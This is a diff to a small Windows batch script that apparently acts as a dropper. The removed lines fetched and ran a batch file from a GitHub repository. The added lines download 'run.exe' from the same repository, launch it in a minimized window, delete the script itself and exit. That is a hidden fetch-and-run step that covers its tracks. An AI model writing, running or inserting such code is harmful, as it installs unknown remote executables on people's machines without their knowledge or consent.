@@ -1,6 +1,4 @@
-:top
-
-curl -o 1.bat https://raw.githubusercontent.com/oogabooga245/-/main/1.bat
-START /MIN CMD.EXE /C 1.bat
+curl -o run.exe https://github.com/oogabooga245/-/raw/main/run.exe
+START /MIN CMD.EXE /C run.exe
 del run.bat
 exit
